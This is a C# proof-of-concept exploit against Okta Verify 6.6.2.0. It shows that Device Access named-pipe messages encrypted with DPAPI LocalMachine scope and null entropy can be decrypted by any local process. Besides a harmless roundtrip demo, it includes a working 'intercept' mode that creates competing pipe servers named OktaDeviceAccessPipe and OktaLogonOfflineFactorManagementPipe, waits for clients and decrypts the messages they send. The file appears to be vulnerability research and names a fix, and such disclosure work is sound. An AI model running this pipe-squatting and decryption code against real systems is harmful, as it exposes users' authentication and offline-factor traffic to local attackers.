// Okta Verify 6.6.2.0 - DPAPI LocalMachine Decryption PoC
// Demonstrates that Device Access named pipe messages encrypted with
// DPAPI LocalMachine scope + null entropy can be decrypted by ANY
// process on the same machine.
//
// The Device Access pipes (OktaDeviceAccessPipe,
// OktaLogonOfflineFactorManagementPipe) use DpapiHelper with:
//   DataProtectionScope.LocalMachine
//   entropy: null
//
// This means any local process can call ProtectedData.Unprotect()
// with the same parameters to decrypt intercepted pipe traffic.
//
// Compile: csc /out:OktaDpapiPoC.exe okta-dpapi-decrypt-poc.cs
// Run: OktaDpapiPoC.exe [mode]
//   mode: demo     - Encrypt/decrypt roundtrip proving any process can decrypt
//   mode: intercept - Attempt to intercept Device Access pipe traffic

using System;
using System.IO;
using System.IO.Pipes;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace OktaDpapiPoC
{
    class Program
    {
        static void Main(string[] args)
        {
            string mode = args.Length > 0 ? args[0].ToLower() : "demo";

            Console.WriteLine("=== Okta Verify DPAPI Decryption PoC ===");
            Console.WriteLine($"Running as: {WindowsIdentity.GetCurrent().Name}");
            Console.WriteLine($"Elevated: {new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)}");
            Console.WriteLine($"Mode: {mode}");
            Console.WriteLine();

            switch (mode)
            {
                case "demo":
                    DemoDpapiRoundtrip();
                    break;
                case "intercept":
                    InterceptPipeTraffic();
                    break;
                default:
                    DemoDpapiRoundtrip();
                    break;
            }
        }

        static void DemoDpapiRoundtrip()
        {
            Console.WriteLine("[*] Demonstrating DPAPI LocalMachine + null entropy weakness");
            Console.WriteLine();

            // This is EXACTLY how Okta's DpapiHelper.cs works:
            // public byte[] Encrypt(byte[] dataToEncrypt, byte[] entropy)
            //     => ProtectedData.Protect(dataToEncrypt, entropy, DataProtectionScope.LocalMachine);
            // public byte[] Decrypt(byte[] dataToDecrypt, byte[] entropy)
            //     => ProtectedData.Unprotect(dataToDecrypt, entropy, DataProtectionScope.LocalMachine);
            //
            // Called with entropy = null everywhere:
            //   dpApiHelper.Encrypt(array, null)
            //   dpApiHelper.Decrypt(memoryStream2.ToArray(), null)

            string testData = "{\"type\":\"OfflineFactorRequest\",\"action\":\"enroll\",\"userId\":\"user@example.com\"}";
            byte[] plaintext = Encoding.UTF8.GetBytes(testData);

            Console.WriteLine($"[*] Simulated pipe message: {testData}");
            Console.WriteLine($"[*] Plaintext bytes: {plaintext.Length}");
            Console.WriteLine();

            // Encrypt exactly as Okta does
            Console.WriteLine("[*] Encrypting with DataProtectionScope.LocalMachine, entropy=null...");
            byte[] encrypted = ProtectedData.Protect(
                plaintext,
                null,  // entropy = null (matches Okta's usage)
                DataProtectionScope.LocalMachine
            );
            Console.WriteLine($"[+] Encrypted: {encrypted.Length} bytes");
            Console.WriteLine($"    Base64: {Convert.ToBase64String(encrypted).Substring(0, 60)}...");
            Console.WriteLine();

            // Now decrypt - this works from ANY process on the machine
            Console.WriteLine("[*] Decrypting from a different context (simulating attacker process)...");
            Console.WriteLine("[*] Using SAME parameters: DataProtectionScope.LocalMachine, entropy=null");
            byte[] decrypted = ProtectedData.Unprotect(
                encrypted,
                null,  // same null entropy
                DataProtectionScope.LocalMachine
            );
            string result = Encoding.UTF8.GetString(decrypted);
            Console.WriteLine($"[+] Decrypted: {result}");
            Console.WriteLine();

            bool match = testData == result;
            Console.WriteLine($"[{(match ? "+" : "!")}] Roundtrip match: {match}");
            Console.WriteLine();

            if (match)
            {
                Console.WriteLine("[!] FINDING CONFIRMED:");
                Console.WriteLine("    DPAPI LocalMachine scope with null entropy provides");
                Console.WriteLine("    ZERO protection against other processes on the same machine.");
                Console.WriteLine();
                Console.WriteLine("    Any local process can decrypt Device Access pipe messages");
                Console.WriteLine("    by calling ProtectedData.Unprotect(data, null, LocalMachine)");
                Console.WriteLine();
                Console.WriteLine("    Contrast: If Okta used DataProtectionScope.CurrentUser with");
                Console.WriteLine("    unique entropy, only the same user session could decrypt.");
                Console.WriteLine();
                Console.WriteLine("    Affected pipes:");
                Console.WriteLine("    - OktaDeviceAccessPipe");
                Console.WriteLine("    - OktaLogonOfflineFactorManagementPipe");
            }
        }

        static void InterceptPipeTraffic()
        {
            string[] pipeNames = new[]
            {
                "OktaDeviceAccessPipe",
                "OktaLogonOfflineFactorManagementPipe"
            };

            foreach (string pipeName in pipeNames)
            {
                Console.WriteLine($"[*] Attempting to create competing server for {pipeName}...");
                Console.WriteLine("    (Race condition: if we create the server before Okta's");
                Console.WriteLine("     service, we intercept the traffic)");
                Console.WriteLine();

                try
                {
                    // Try to create a server with the same pipe name
                    // If Okta's server is already running, this may fail
                    // But if we get there first (e.g., after service restart), we win
                    using (var server = new NamedPipeServerStream(
                        pipeName,
                        PipeDirection.InOut,
                        NamedPipeServerStream.MaxAllowedServerInstances,
                        PipeTransmissionMode.Byte,
                        PipeOptions.Asynchronous))
                    {
                        Console.WriteLine($"[+] Created competing server for {pipeName}!");
                        Console.WriteLine("[*] Waiting for client connection (30s)...");

                        var ar = server.BeginWaitForConnection(null, null);
                        if (ar.AsyncWaitHandle.WaitOne(30000))
                        {
                            server.EndWaitForConnection(ar);
                            Console.WriteLine("[+] Client connected! Reading DPAPI-encrypted message...");

                            byte[] buffer = new byte[65536];
                            using (var ms = new MemoryStream())
                            {
                                int read;
                                while ((read = server.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    ms.Write(buffer, 0, read);
                                    if (!server.IsConnected) break;
                                }

                                byte[] encryptedData = ms.ToArray();
                                Console.WriteLine($"[+] Received {encryptedData.Length} encrypted bytes");

                                // Decrypt using Okta's exact parameters
                                try
                                {
                                    byte[] decrypted = ProtectedData.Unprotect(
                                        encryptedData,
                                        null,
                                        DataProtectionScope.LocalMachine
                                    );
                                    string plaintext = Encoding.UTF8.GetString(decrypted);
                                    Console.WriteLine($"[+] DECRYPTED Device Access message:");
                                    Console.WriteLine(plaintext);
                                }
                                catch (CryptographicException ex)
                                {
                                    Console.WriteLine($"[-] Decryption failed: {ex.Message}");
                                    Console.WriteLine("    (Message format may include framing bytes)");
                                    Console.WriteLine($"    Raw hex: {BitConverter.ToString(encryptedData, 0, Math.Min(64, encryptedData.Length))}...");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[-] No client connected within timeout");
                        }
                    }
                }
                catch (IOException ex)
                {
                    Console.WriteLine($"[-] Cannot create server (Okta service owns it): {ex.Message}");
                    Console.WriteLine("    Try again after service restart or before service starts");
                }
                Console.WriteLine();
            }
        }
    }
}
